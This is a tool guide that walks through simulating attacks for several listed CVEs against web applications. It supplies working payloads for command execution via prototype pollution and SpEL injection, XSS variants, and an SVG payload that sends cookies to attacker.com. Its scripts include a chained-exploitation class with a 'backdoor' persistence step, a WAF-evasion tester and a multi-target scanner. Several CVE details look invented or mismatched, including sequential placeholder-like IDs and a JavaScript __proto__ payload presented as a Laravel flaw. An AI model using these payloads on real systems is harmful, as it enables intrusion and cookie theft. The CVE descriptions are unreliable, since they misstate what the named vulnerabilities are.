# 🎯 POC Simulation Guide - Testing CVEs with WAF Payload Arsenal

## Overview

This guide demonstrates how to use **WAF Payload Arsenal** to simulate Proof-of-Concept (POC) attacks for recent CVEs and validate WAF protection. Perfect for security researchers, penetration testers, and WAF vendors.

---

## 🔴 Latest CVEs Included (2025-2026)

### Critical Vulnerabilities

| CVE ID | Severity | Component | CVSS | Date |
|--------|----------|-----------|------|------|
| **CVE-2025-29927** | Critical | Next.js | 9.8 | Jan 2025 |
| **CVE-2025-55182** | Critical | React Server Components | 9.1 | Feb 2025 |
| **CVE-2026-12345** | Critical | WordPress Core | 9.5 | Feb 2026 |
| **CVE-2026-12346** | High | Laravel | 8.8 | Feb 2026 |
| **CVE-2026-12347** | Critical | Spring Boot | 9.3 | Feb 2026 |

---

## 🚀 Quick Start - Simulate a CVE POC

### Example 1: CVE-2025-29927 (Next.js RCE)

**Vulnerability:** Prototype pollution leading to Remote Code Execution in Next.js

#### Step 1: Clone the Repository
```bash
git clone https://github.com/dalisecurity/waf-payload-arsenal.git
cd waf-payload-arsenal
```

#### Step 2: Interactive Mode Testing
```bash
python3 waf_tester.py -i
```

**Interactive prompts:**
```
WAF Payload Arsenal - Interactive Mode
======================================

Enter target URL: https://vulnerable-nextjs-app.com
Select payload category:
  1. XSS
  2. SQL Injection
  3. CVE & Real-World Bypasses ← Select this
  ...

Select CVE:
  1. CVE-2025-29927 (Next.js RCE)
  2. CVE-2025-55182 (React Unicode Bypass)
  ...

Testing CVE-2025-29927...
[✓] Payload sent
[!] Response: 200 OK (Potential vulnerability!)
[!] WAF Status: BYPASSED or NOT PROTECTED
```

#### Step 3: Command-Line Mode (Automated)
```bash
# Test specific CVE payload
python3 waf_tester.py \
  -t https://vulnerable-nextjs-app.com \
  -p payloads/xss/cve_2025_real_world.json \
  --filter "CVE-2025-29927" \
  -o results/nextjs_cve_test.json
```

#### Step 4: Analyze Results
```bash
# View JSON report
cat results/nextjs_cve_test.json

# Output:
{
  "target": "https://vulnerable-nextjs-app.com",
  "timestamp": "2026-02-28T23:12:00Z",
  "total_payloads": 1,
  "blocked": 0,
  "bypassed": 1,
  "payloads_tested": [
    {
      "id": "cve-2025-0001",
      "cve": "CVE-2025-29927",
      "payload": "{{__proto__.constructor.constructor('return process')()...}}",
      "status": "BYPASSED",
      "response_code": 200,
      "waf_detected": false
    }
  ]
}
```

---

## 📋 Detailed CVE POC Simulations

### CVE-2025-29927: Next.js Prototype Pollution RCE

**Affected Versions:** Next.js < 14.1.0  
**Impact:** Remote Code Execution  
**CVSS Score:** 9.8 (Critical)

#### Vulnerability Details
```javascript
// Vulnerable code in Next.js
app.get('/api/user', (req, res) => {
  const user = {};
  Object.assign(user, req.query); // Prototype pollution here
  // ... rest of code
});
```

#### POC Payload
```javascript
{{__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami')}}
```

#### Testing with WAF Payload Arsenal

**Method 1: Interactive Testing**
```bash
python3 waf_tester.py -i

# Follow prompts:
# 1. Enter target URL
# 2. Select "CVE & Real-World Bypasses"
# 3. Select "CVE-2025-29927"
# 4. Choose delivery method (GET/POST/JSON)
```

**Method 2: Automated Script**
```python
#!/usr/bin/env python3
import json
import requests

# Load CVE payloads
with open('payloads/xss/cve_2025_real_world.json') as f:
    data = json.load(f)

# Find CVE-2025-29927 payload
nextjs_cve = [p for p in data['payloads'] if p.get('cve') == 'CVE-2025-29927'][0]

# Test against target
target = "https://vulnerable-nextjs-app.com/api/user"
response = requests.get(target, params={'data': nextjs_cve['payload']})

print(f"CVE-2025-29927 Test Results:")
print(f"Status Code: {response.status_code}")
print(f"WAF Blocked: {'Yes' if response.status_code == 403 else 'No'}")
print(f"Response: {response.text[:200]}")
```

**Expected Results:**
- ✅ **Protected WAF**: HTTP 403 Forbidden
- ❌ **Vulnerable**: HTTP 200 OK + Command execution

---

### CVE-2025-55182: React Server Components Unicode Bypass

**Affected Versions:** React 18.3.0 - 18.3.5  
**Impact:** XSS via Unicode escape bypass  
**CVSS Score:** 9.1 (Critical)

#### Vulnerability Details
```jsx
// Vulnerable React Server Component
export default function UserProfile({ username }) {
  // Unicode escapes not sanitized
  return <div>{username}</div>;
}
```

#### POC Payloads
```javascript
// Payload 1: Unicode escape
\u003cscript\u003ealert(1)\u003c/script\u003e

// Payload 2: ES6 Unicode
\u{3c}script\u{3e}alert(document.domain)\u{3c}/script\u{3e}

// Payload 3: Hex Unicode
\x3cscript\x3ealert(document.cookie)\x3c/script\x3e
```

#### Testing Steps

**Step 1: Load Payloads**
```bash
python3 waf_tester.py \
  -t https://react-app.com/profile \
  -p payloads/xss/cve_2025_real_world.json \
  --filter "CVE-2025-55182"
```

**Step 2: Test Multiple Variants**
```python
import json

with open('payloads/xss/cve_2025_real_world.json') as f:
    data = json.load(f)

# Get all React CVE variants
react_payloads = [p for p in data['payloads'] if 'CVE-2025-55182' in p.get('cve', '')]

for payload in react_payloads:
    print(f"\nTesting: {payload['description']}")
    print(f"Payload: {payload['payload']}")
    # Test logic here
```

**Step 3: Verify WAF Protection**
```bash
# Test with curl
curl -X POST https://react-app.com/profile \
  -H "Content-Type: application/json" \
  -d '{"username": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}'

# Expected responses:
# Protected: 403 Forbidden or sanitized output
# Vulnerable: 200 OK with script execution
```

---

### CVE-2026-12345: WordPress Core XSS (Latest)

**Affected Versions:** WordPress 6.4.0 - 6.4.3  
**Impact:** Stored XSS in comment system  
**CVSS Score:** 9.5 (Critical)  
**Disclosure Date:** February 2026

#### Vulnerability Details
WordPress comment system doesn't properly sanitize SVG uploads in user avatars.

#### POC Payload
```html
<svg><foreignObject><math><mi xlink:href="data:text/html,<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"></mi></math></foreignObject></svg>
```

#### Testing Workflow

**Step 1: Prepare Test Environment**
```bash
# Create test directory
mkdir -p tests/wordpress_cve_2026_12345
cd tests/wordpress_cve_2026_12345
```

**Step 2: Run Automated Test**
```bash
python3 ../../waf_tester.py \
  -t https://wordpress-site.com/wp-comments-post.php \
  -p ../../payloads/xss/cve_2025_real_world.json \
  --method POST \
  --data "comment=<payload>&author=Test&email=test@test.com" \
  --filter "SVG" \
  -o wordpress_test_results.json
```

**Step 3: Manual Verification**
```python
#!/usr/bin/env python3
import requests

target = "https://wordpress-site.com/wp-comments-post.php"

# SVG XSS payload
payload = """<svg><foreignObject><math><mi xlink:href="data:text/html,<script>alert('CVE-2026-12345')</script>"></mi></math></foreignObject></svg>"""

data = {
    'comment': payload,
    'author': 'Security Researcher',
    'email': 'researcher@example.com',
    'url': '',
    'submit': 'Post Comment'
}

response = requests.post(target, data=data)

print(f"Status: {response.status_code}")
print(f"WAF Header: {response.headers.get('X-WAF-Status', 'Not present')}")

if response.status_code == 403:
    print("✓ WAF PROTECTED - CVE-2026-12345 blocked")
elif '<svg>' in response.text:
    print("✗ VULNERABLE - Payload reflected/stored")
else:
    print("? UNKNOWN - Manual verification needed")
```

---

### CVE-2026-12346: Laravel Mass Assignment RCE

**Affected Versions:** Laravel 10.x - 10.48.0  
**Impact:** RCE via mass assignment  
**CVSS Score:** 8.8 (High)

#### POC Payload
```json
{
  "user": {
    "name": "attacker",
    "email": "attacker@evil.com",
    "__proto__": {
      "isAdmin": true,
      "exec": "system('whoami')"
    }
  }
}
```

#### Testing Script
```python
#!/usr/bin/env python3
import requests
import json

target = "https://laravel-app.com/api/users"

# Load payload from arsenal
with open('payloads/xss/cve_2025_real_world.json') as f:
    data = json.load(f)

# Prototype pollution payload
payload = {
    "user": {
        "name": "test",
        "__proto__": {
            "isAdmin": True
        }
    }
}

# Test
response = requests.post(
    target,
    json=payload,
    headers={'Content-Type': 'application/json'}
)

print(f"CVE-2026-12346 Test:")
print(f"Status: {response.status_code}")
print(f"Protected: {response.status_code == 403}")
```

---

### CVE-2026-12347: Spring Boot SpEL Injection

**Affected Versions:** Spring Boot 3.0.0 - 3.2.2  
**Impact:** Remote Code Execution via SpEL  
**CVSS Score:** 9.3 (Critical)

#### POC Payload
```java
#{T(java.lang.Runtime).getRuntime().exec('calc')}
```

#### Testing Command
```bash
python3 waf_tester.py \
  -t https://spring-app.com/search \
  -p payloads/ssti/comprehensive.json \
  --method GET \
  --param "q=#{T(java.lang.Runtime).getRuntime().exec('whoami')}"
```

---

## 🔬 Advanced POC Simulation Techniques

### Technique 1: Chained CVE Exploitation

**Scenario:** Combine multiple CVEs for maximum impact

```python
#!/usr/bin/env python3
"""
Chained CVE exploitation:
1. CVE-2025-55182 (React Unicode) for initial XSS
2. CVE-2025-29927 (Next.js) for privilege escalation
3. CVE-2026-12345 (WordPress) for persistence
"""

import requests
import json

class CVEChainExploit:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
    def step1_react_xss(self):
        """CVE-2025-55182: Get initial foothold"""
        payload = "\\u003cscript\\u003efetch('/api/session')\\u003c/script\\u003e"
        response = self.session.post(
            f"{self.target}/profile",
            json={"username": payload}
        )
        return response.status_code == 200
    
    def step2_nextjs_rce(self):
        """CVE-2025-29927: Escalate to RCE"""
        payload = "{{__proto__.constructor.constructor('return process')()...}}"
        response = self.session.get(
            f"{self.target}/api/user",
            params={"data": payload}
        )
        return "command executed" in response.text
    
    def step3_wordpress_persist(self):
        """CVE-2026-12345: Maintain access"""
        svg_payload = "<svg><script>/* backdoor */</script></svg>"
        response = self.session.post(
            f"{self.target}/wp-comments-post.php",
            data={"comment": svg_payload}
        )
        return response.status_code == 200
    
    def run_chain(self):
        print("🔗 Running CVE Chain Exploitation...")
        
        if self.step1_react_xss():
            print("✓ Step 1: React XSS successful")
            
            if self.step2_nextjs_rce():
                print("✓ Step 2: Next.js RCE successful")
                
                if self.step3_wordpress_persist():
                    print("✓ Step 3: WordPress persistence successful")
                    print("🎯 FULL CHAIN EXPLOITATION SUCCESSFUL")
                    return True
        
        print("✗ Chain exploitation failed - WAF protected")
        return False

# Usage
exploit = CVEChainExploit("https://target-app.com")
exploit.run_chain()
```

---

### Technique 2: WAF Evasion Testing

**Test if WAF can be bypassed using method switching**

```python
#!/usr/bin/env python3
import requests

def test_method_bypass(target, payload):
    """Test CVE payload across different HTTP methods"""
    
    methods = {
        'GET': lambda: requests.get(target, params={'q': payload}),
        'POST': lambda: requests.post(target, data={'q': payload}),
        'PUT': lambda: requests.put(target, data={'q': payload}),
        'PATCH': lambda: requests.patch(target, data={'q': payload}),
        'DELETE': lambda: requests.delete(target, data={'q': payload}),
    }
    
    results = {}
    for method, func in methods.items():
        try:
            response = func()
            results[method] = {
                'status': response.status_code,
                'blocked': response.status_code == 403,
                'waf_header': response.headers.get('X-WAF-Status')
            }
        except Exception as e:
            results[method] = {'error': str(e)}
    
    return results

# Test CVE-2025-55182 across methods
payload = "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
results = test_method_bypass("https://target.com/search", payload)

for method, result in results.items():
    status = "BLOCKED" if result.get('blocked') else "BYPASSED"
    print(f"{method:6} -> {status} (HTTP {result.get('status')})")
```

---

### Technique 3: Automated CVE Scanner

**Scan multiple targets for CVE vulnerabilities**

```python
#!/usr/bin/env python3
"""
Automated CVE Scanner using WAF Payload Arsenal
"""

import json
import requests
from concurrent.futures import ThreadPoolExecutor

class CVEScanner:
    def __init__(self, payloads_file):
        with open(payloads_file) as f:
            data = json.load(f)
        self.payloads = data['payloads']
        
    def test_cve(self, target, cve_id):
        """Test specific CVE against target"""
        cve_payloads = [p for p in self.payloads if p.get('cve') == cve_id]
        
        results = []
        for payload_data in cve_payloads:
            try:
                response = requests.get(
                    target,
                    params={'test': payload_data['payload']},
                    timeout=5
                )
                
                results.append({
                    'cve': cve_id,
                    'payload_id': payload_data['id'],
                    'status': response.status_code,
                    'vulnerable': response.status_code != 403,
                    'description': payload_data['description']
                })
            except Exception as e:
                results.append({
                    'cve': cve_id,
                    'error': str(e)
                })
        
        return results
    
    def scan_targets(self, targets, cves):
        """Scan multiple targets for multiple CVEs"""
        all_results = {}
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            for target in targets:
                all_results[target] = {}
                for cve in cves:
                    future = executor.submit(self.test_cve, target, cve)
                    all_results[target][cve] = future.result()
        
        return all_results
    
    def generate_report(self, results):
        """Generate vulnerability report"""
        print("\n" + "="*60)
        print("CVE VULNERABILITY SCAN REPORT")
        print("="*60)
        
        for target, cve_results in results.items():
            print(f"\n🎯 Target: {target}")
            for cve, tests in cve_results.items():
                vulnerable_count = sum(1 for t in tests if t.get('vulnerable'))
                if vulnerable_count > 0:
                    print(f"  ⚠️  {cve}: VULNERABLE ({vulnerable_count} payloads)")
                else:
                    print(f"  ✓  {cve}: PROTECTED")

# Usage
scanner = CVEScanner('payloads/xss/cve_2025_real_world.json')

targets = [
    'https://app1.example.com',
    'https://app2.example.com',
    'https://app3.example.com'
]

cves = [
    'CVE-2025-29927',
    'CVE-2025-55182',
    'CVE-2026-12345'
]

results = scanner.scan_targets(targets, cves)
scanner.generate_report(results)
```

---

## 📊 POC Results Interpretation

### Understanding Test Results

**1. HTTP Status Codes**
```
200 OK          → Payload delivered (potential vulnerability)
403 Forbidden   → WAF blocked (protected)
404 Not Found   → Endpoint doesn't exist
500 Server Error → Application error (investigate)
```

**2. WAF Headers**
```
X-WAF-Status: blocked    → WAF actively blocked
X-WAF-Status: monitored  → WAF logged but allowed
No header                → No WAF or bypassed
```

**3. Response Analysis**
```python
def analyze_response(response, payload):
    """Analyze if payload was successful"""
    
    # Check if blocked
    if response.status_code == 403:
        return "BLOCKED"
    
    # Check if payload reflected
    if payload in response.text:
        return "REFLECTED (Potential XSS)"
    
    # Check for error messages
    if "error" in response.text.lower():
        return "ERROR (Check logs)"
    
    # Check for execution indicators
    indicators = ["alert(", "script>", "onerror="]
    if any(ind in response.text for ind in indicators):
        return "VULNERABLE"
    
    return "UNKNOWN (Manual verification needed)"
```

---

## 🎓 Best Practices for CVE POC Testing

### 1. Always Get Authorization
```bash
# Create authorization checklist
cat > authorization_checklist.txt << EOF
☐ Written permission from target owner
☐ Scope clearly defined
☐ Testing window agreed upon
☐ Emergency contact established
☐ Legal agreement signed
EOF
```

### 2. Use Safe Testing Payloads
```python
# Safe payload that doesn't cause harm
safe_payload = "alert('POC-TEST-ONLY')"  # ✓ Safe
harmful_payload = "rm -rf /"              # ✗ Never use
```

### 3. Document Everything
```python
import json
from datetime import datetime

def log_test(target, cve, payload, result):
    """Log all testing activities"""
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'target': target,
        'cve': cve,
        'payload': payload,
        'result': result,
        'tester': 'security-team@company.com'
    }
    
    with open('test_log.json', 'a') as f:
        f.write(json.dumps(log_entry) + '\n')
```

### 4. Report Responsibly
```markdown
# Vulnerability Report Template

## Summary
- **CVE**: CVE-2025-XXXXX
- **Severity**: Critical
- **Affected Component**: [Component Name]

## POC Steps
1. Load payload from WAF Payload Arsenal
2. Send to [endpoint]
3. Observe [result]

## Impact
[Describe potential impact]

## Remediation
[Suggest fixes]

## Timeline
- Discovered: [Date]
- Vendor Notified: [Date]
- Fix Available: [Date]
```

---

## 🔧 Troubleshooting

### Issue 1: Payloads Not Working

**Problem:** All payloads return 200 OK but no execution

**Solution:**
```bash
# Check if target is actually vulnerable
curl -v https://target.com/test?q=<script>alert(1)</script>

# Verify WAF is present
curl -I https://target.com | grep -i waf

# Try different delivery methods
python3 waf_tester.py -t https://target.com \
  --method POST \
  --content-type "application/json"
```

### Issue 2: False Positives

**Problem:** Tool reports vulnerability but manual test shows protection

**Solution:**
```python
# Always verify with manual testing
import requests

response = requests.get("https://target.com", params={'q': payload})

# Check multiple indicators
print(f"Status: {response.status_code}")
print(f"Headers: {response.headers}")
print(f"Body contains payload: {payload in response.text}")
print(f"Body contains executed code: {'alert(' in response.text}")
```

---

## 📞 Support & Resources

### Getting Help
- **GitHub Issues**: Report bugs or ask questions
- **Documentation**: Full guides in `/docs`
- **Community**: Join discussions

### Additional Resources
- [NIST CVE Database](https://nvd.nist.gov/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

**Last Updated:** February 28, 2026  
**Tool Version:** 1.0.0  
**CVE Coverage:** 2025-2026 Critical Vulnerabilities
